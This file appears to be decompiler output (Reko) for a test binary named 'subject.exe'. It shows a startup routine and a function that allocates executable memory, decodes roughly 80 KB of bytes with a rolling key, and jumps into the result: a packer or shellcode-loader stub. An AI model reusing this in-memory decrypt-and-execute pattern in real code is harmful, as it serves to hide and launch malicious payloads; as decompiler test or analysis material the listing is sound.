// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00406398: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_2 eax_12 = IsWindow(dwArg04);
	if (eax_12 == 0x00)
		eax_12 = fn004063D4((byte) GetPrivateProfileIntA(fp - 0x04, fp - 0x04, 0xF3, fp - 0x04), 0xF3);
	return eax_12;
}

// 004063D4: Register word32 fn004063D4(Register byte bl, Stack word32 dwArg00)
word32 fn004063D4(byte bl, word32 dwArg00)
{
fn004063D4_entry:
	word32 ecx_19 = 0x01E3
	word32 * esp_114 = fp - 0x04
	union Eq_38 * esi_24 = dwArg00 + 0xA8
	Eq_42 edi_25 = VirtualAlloc(0x00, 81891, 0x3000, 0x40)
	uint32 edx_30 = DPB(3157999096, bl + ~0x07, 0)
	word32 ebp_103 = 0x00
	goto l00406410
l004063D4:
l00406410:
	uint32 * esp_44 = esp_114 - 0x04
	*esp_44 = edx_30
	*(esp_44 - 0x04) = ecx_19
	*edi_25 = (word32) *edi_25 + (byte) ((char *) (*esi_24) + *esp_44)
	word32 ebp_67 = ebp_103 + 259622
	uint32 edx_60 = *esp_44
	word32 ecx_57 = *(esp_44 - 0x04)
	esp_114 = esp_44 + 0x01
	esi_24 = (union Eq_38 *) ((char *) esi_24 + 0x01)
	edi_25 = edi_25 + 0x01
	ebp_103 = ebp_67 - 259621
	uint32 edx_100 = edx_60 >> 0x08
	byte dl_101 = (byte) (edx_60 >> 0x08)
	branch 0x04 != ebp_67 - 259621 l00406458
l00406450:
	*esp_44 = 3157999096
	edx_100 = *esp_44
	dl_101 = (byte) edx_100
	esp_114 = esp_44 + 0x01
	ebp_103 = 0x00
l00406458:
	byte dl_83 = dl_101 + bl
	word32 ecx_85 = ecx_57 - 0x00045E41
	edx_30 = DPB(edx_100, dl_83, 0)
	ecx_19 = ecx_85 + 286272
	branch ecx_85 != 286272 l00406410
l0040646A:
	<anonymous> * eax_91 = *esp_114
	word32 eax_95
	byte SCZO_97
	byte cl_104
	byte SZO_105
	byte C_106
	byte Z_107
	eax_91()
	branch false l00406458
l00406476:
	return eax_95
fn004063D4_exit:
}

